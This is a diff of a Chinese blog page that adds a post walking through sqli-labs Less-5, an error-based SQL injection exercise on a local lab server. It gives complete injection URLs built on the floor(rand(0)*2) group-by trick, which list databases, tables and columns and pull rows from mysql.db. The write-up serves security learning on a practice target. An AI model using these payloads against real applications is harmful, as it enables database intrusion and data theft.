@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Category: TCP/IP | 大棟哥の博客</title>
+  <title>sqli-5 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -252,37 +252,66 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-
-
-<section id="services">
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/05/15/TCP-IP-data-transport/">TCP/IP data transport</a></h4>
-                            
-                            <p><time datetime="2016-05-15T15:08:25.000Z"><a href="/2016/05/15/TCP-IP-data-transport/">2016-05-15</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2016-07-08T00:40:01.000Z" itemprop="datePublished">
+          2016-07-08
+      </time>
+    
+</span>
+                <h1>sqli-5</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<p>注入类型：报错注入<br>1.实验环境：centos上搭建的sqli实验环境，通过本机Firefox上的hackbar插件进行sql注入测试：<br>进入实验二界面：<br><a href="http://192.168.111.132/Less-5/" target="_blank" rel="external">http://192.168.111.132/Less-5/</a><br>原理：报错注入，使用某一特定的报错语句，让sql语句在执行中出错，能爆出管理员账号密码。但是有个条件，就是在执行sql语句的时候调用了mysql_error函数，否则不会显示报错信息。比如bluecms就没有调用mysql_error，所以不能使用这个方法。<br>公式：and(select 1 from(select count(<em>),concat((select (select ( payload ))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)</p>
+<p>首先进入测试站点：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"><br>根据提示输入参数：<br><a href="http://192.168.111.132/Less-5/?id=1显示正常" target="_blank" rel="external">http://192.168.111.132/Less-5/?id=1显示正常</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
+<p>1、测试有几个数据库：<br>payload：select count(distinct+table_schema)from information_schema.tables</p>
+<p><a href="http://192.168.111.132/Less-5/?id=" target="_blank" rel="external">http://192.168.111.132/Less-5/?id=</a><br>1’+and(select 1 from(select count(<em>),concat((select (select (select count(distinct+table_schema)from informatin_schemation.tables)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br>查询去重之后有17个数据库，后边的1是一个随机数由floor(rand(0)*2)随机固定值<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"></p>
+<p>2、查询库名：<br>payload:select distinct concat(table_schema)from information_schema.tables limit 0,1</p>
+<p><a href="http://192.168.111.132/Less-5/?id=" target="_blank" rel="external">http://192.168.111.132/Less-5/?id=</a><br>1’+and(select 1 from(select count(<em>),concat((select (select (select distinct concat(table_schema)from information_schema.tables limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br>爆出第一个数据库名称为：information_schema<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"></p>
+<p>payload:select distinct concat(table_schema)from information_schema.tables limit 1,1</p>
+<p>爆出第二个数据库为：challenges<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"><br>、、、、、、、、、、、、、、、、、、、、、、、、<br>payload:select distinct concat(table_schema)from information_schema.tables limit 16,1</p>
+<p>爆出第十七个数据库为：user<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"></p>
+<p>3、爆某个库中的表：<br>payload:select distinct concat(table_name)from information_schema.tables where table_schema=’mysql’ limit 1,1</p>
+<p><a href="http://192.168.111.132/Less-5/?id=" target="_blank" rel="external">http://192.168.111.132/Less-5/?id=</a><br>1’+and(select 1 from(select count(<em>),concat((select (select (select distinct concat(table_name)from information_schema.tables where table_schema=’mysql’ limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"></p>
+<p>4.爆某个表中的字段：<br>payload:select (select distinct concat(column_name)from information_schema.columns where table_schema=’mysql’ and table_name=’db’ limit 0,1</p>
+<p><a href="http://192.168.111.132/Less-5/?id=" target="_blank" rel="external">http://192.168.111.132/Less-5/?id=</a><br>1’+and(select 1 from(select count(<em>),concat((select (select (select distinct concat(column_name)from information_schema.columns where table_schema=’mysql’ and table_name=’db’ limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"></p>
+<p>5.爆出内容：<br>payload:select distinct concat(Host)from mysql.db limit 0,1</p>
+<p><a href="http://192.168.111.132/Less-5/?id=" target="_blank" rel="external">http://192.168.111.132/Less-5/?id=</a><br>1’+and(select 1 from(select count(<em>),concat((select (select (select distinct concat(Host)from mysql.db limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-5/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"><br>game over<br>注意：报错注入方法：可以使用concat 不能使用group_concat</p>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>业精于勤，荒于嬉；行成于思，毁于随。</p>
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="pagination" role="pagination">
+    
+    
+    <a class="pull-right" href="/2016/07/07/sqli-4/">
+        sqli-4 →
+    </a>
+    
+</nav>
+
+        <div class="duoshuo">
+<div class="ds-thread" data-thread-key="2016/07/08/sqli-5/" data-title="sqli-5" data-url="http://jiadong.xin/2016/07/08/sqli-5/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"duoshuo_name"};
+(function() {
+	var ds = document.createElement('script');
+	ds.type = 'text/javascript';ds.async = true;
+	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	ds.charset = 'UTF-8';
+	(document.getElementsByTagName('head')[0] 
+	 || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+</div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
